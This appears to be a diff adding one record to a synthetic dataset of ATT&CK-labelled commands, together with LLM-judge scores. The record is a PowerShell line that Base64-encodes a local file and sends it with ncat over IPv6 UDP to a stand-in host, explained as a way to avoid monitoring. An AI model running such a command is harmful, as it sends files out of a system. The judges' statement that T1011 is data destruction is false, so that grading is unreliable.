@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u 2001:db8:dead:beef::20 57344 --send-only",
+  "explanation": "Uses Nmap's ncat to exfiltrate over IPv6 UDP to a high, uncommon port, distinct from typical web egress. Base64 reduces readability while staying within simple encoding, consistent with T1011\u2019s use of a different network medium.",
+  "rationale_steps": [
+    "Encode file bytes to Base64.",
+    "Transmit over IPv6 UDP to an uncommon high-numbered port to avoid standard monitoring paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-21870377",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper PowerShell syntax for variable assignment, conversion operations, and piping to ncat with valid command-line arguments.",
+        "semantic_score": 2,
+        "semantic_justification": "The command is misaligned with T1011 (Data Destruction) as it performs data exfiltration over IPv6 UDP rather than destroying or rendering data unrecoverable.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T01:03:24.459287Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell commands for reading a file, Base64 encoding, variable assignment, and piping to ncat.exe are perfectly well-formed with correct syntax for arguments and flags.",
+        "semantic_score": 0,
+        "semantic_justification": "The command reads and exfiltrates a file's content (via Base64 over UDP), which is a data exfiltration technique, not data destruction (T1011), as it leaves the original file intact on the system.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:03:30.459679Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell variable assignment and piping are correctly formed with balanced quotes, valid separators, and ncat flags/arguments that are syntactically valid.",
+        "semantic_score": 2,
+        "semantic_justification": "The command plausibly exfiltrates data via IPv6/UDP using ncat as explained, but it does not perform any data destruction as described for the stated technique.",
+        "combined_score": 3.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T01:04:55.433132Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
